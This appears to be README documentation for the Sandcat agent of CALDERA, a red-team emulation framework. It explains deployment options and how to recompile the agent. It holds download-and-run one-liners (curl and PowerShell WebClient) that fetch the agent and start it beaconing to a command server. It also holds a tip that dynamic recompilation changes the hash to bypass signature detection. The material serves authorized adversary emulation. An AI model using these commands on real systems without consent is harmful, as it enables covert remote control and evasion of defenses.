Plugin: sandcat
============

The Sandcat plugin, otherwise known as 54ndc47, is the default agent that CALDERA ships with. 54ndc47 is currently written in GoLang for cross-platform compatibility. 

54ndc47 agents require network connectivity to CALDERA at port 8888.

## Deploy 

To deploy 54ndc47, use one of the built-in delivery commands which allows you to run the agent on any operating system. Each of these commands downloads the compiled 54ndc47 executable from CALDERA and runs it immediately:

> You can also go to the plugins -> sandcat GUI page and view these same delivery commands, along with a few other customized options. The delivery commands available there include a few extra goodies, such as persistence and the automatic renaming of the sandcat executable to a random name.

**OSX**:
```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:darwin' http://localhost:8888/file/download > /tmp/sandcat-darwin && chmod +x /tmp/sandcat-darwin && /tmp/sandcat-darwin -server http://localhost:8888 -group my_group -v; 
```

**Linux**:
```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' http://localhost:8888/file/download > /tmp/sandcat-linux && chmod +x /tmp/sandcat-linux && /tmp/sandcat-linux -server http://localhost:8888 -group my_group -v; 
```

**Windows / PowerShell**:
```
$url="http://localhost:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server http://localhost:8888 -group my_group -v;
```

**Windows / Command Prompt**:
```
$url="http://localhost:8888/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);cmd.exe /c C:\Users\Public\sandcat.exe -server http://localhost:8888 -group my_group -executor cmd -v;
```
Once the agent is running, it should show log messages when it beacons into CALDERA.

> If you have GoLang installed on the CALDERA server, each time you run one of the delivery commands above, the agent will re-compile itself dynamically and it will change it's source code so it gets a different file hash (MD5). This will help bypass file-based signature detections.

## Options

When deploying a 54ndc47 agent, there are optional parameters you can use when you start the executable:

* **Server**: This is the location of CALDERA. The agent must have connectivity to this host/port. 
* **Group**: This is the group name that you would like the agent to join when it starts. The group does not have to exist. A default group of my_group will be used if none is passed in.
* **Executors**: A comma-separated list of execution engines to use. On MacOS and Linux, sh is the only option (and the default if this parameter is not passed in). On Windows, psh (PowerShell), cmd (command prompt) and pwsh (open-source PowerShell core) are the options, with psh the default.
* **v**(new): Use `-v` to see verbose output from sandcat.  Otherwise, sandcat will run silently. 

### Customizing Default Options & Execution Without CLI Options

It's possible to customize the default values of these options when pulling sandcat from the CALDERA server.  This is useful if your method of executing sandcat isn't friendly towards including the required options on the command line. The option to change and new values can be specified by adding HTTP headers to the web request: 

* server: specify a new default server. 

For example, the following will download a linux executable that will use `new_group` as a default group instead of `my_group` and have a default sleep interval of `5` seconds instead of `60`.  

```
curl -sk -X POST -H 'file:sandcat.go' -H 'platform:linux' -H 'defaultGroup:new_group' -H 'defaultSleep:5' http://localhost:8888/file/download
```

## Updating the agent

The 54ndc47 agent is compiled dynamically upon request (through the /file/download endpoint) as long as GoLang is installed on the server. Alternatively, you can compile the agent yourself by running one of the following commands:
```
GOOS=windows go build -o ../payloads/sandcat.go-windows -ldflags="-s -w" sandcat.go
GOOS=linux go build -o ../payloads/sandcat.go-linux -ldflags="-s -w" sandcat.go
GOOS=darwin go build -o ../payloads/sandcat.go-darwin -ldflags="-s -w" sandcat.go
```

> There is a script at the root of this plugin called update-agents.sh, which runs the above commands. 

For Windows computers, we assume 64-bit. If you are running 32-bit Windows, you'll want to compile the agent specifically for this. You can do this by running the following command before you run the compile command:
```
set GOARCH=386  
```
